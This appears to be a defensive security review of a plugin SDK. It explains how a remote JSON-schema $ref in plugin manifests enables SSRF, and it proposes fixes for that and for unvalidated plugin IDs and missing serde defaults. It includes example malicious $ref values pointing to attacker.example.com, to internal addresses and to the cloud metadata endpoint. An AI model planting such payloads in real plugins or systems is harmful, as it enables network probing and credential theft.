### Devil's Advocate

What if this SDK ships as-is and a developer builds Story 23.2 (plugin registry) on top of it?

The registry loads manifests from `.axpkg` files — which per the packaging spec (Story 23.6) are ZIP archives containing `manifest.yaml`. A community plugin author writes:

```yaml
config_schema:
  $ref: "https://attacker.example.com/evil-schema.json"
```

When the registry calls `manifest.validate_config(&user_config)`, jsonschema's default retriever (reqwest with blocking) fetches the remote URL. This is SSRF — the attacker can:
1. **Probe internal networks:** `$ref: "http://10.0.0.1:8080/internal-api"` — the server makes the request, timing/error differences reveal topology
2. **Exfiltrate via DNS:** `$ref: "http://data.attacker.com"` — the DNS lookup alone leaks that the server is processing this plugin
3. **Hit cloud metadata:** `$ref: "http://169.254.169.254/latest/meta-data/"` — on AWS/GCP, this leaks IAM credentials

The fix is one line: `jsonschema = { version = "0.28", default-features = false }`. This disables the reqwest retriever while keeping all validation functionality for inline schemas (which is all we use).

Could a confused developer also create `PluginId::new("", "")` and have it silently propagate through the system? Yes. The `builtin("")` and `community("")` helpers are also unvalidated. When Story 23.2's registry keys on namespace for trust decisions, an empty namespace could match unintended patterns or cause key collisions in HashMap lookups.

Could an external manifest YAML file omit optional array fields and cause a deserialization panic? Yes. `serde_json` requires all non-Option fields to be present, and `Vec<String>` is not `Option`. Any external tooling generating manifests must know to include empty arrays for `permissions`, `tags`, `ocsf_classes`. Adding `#[serde(default)]` is the correct fix.
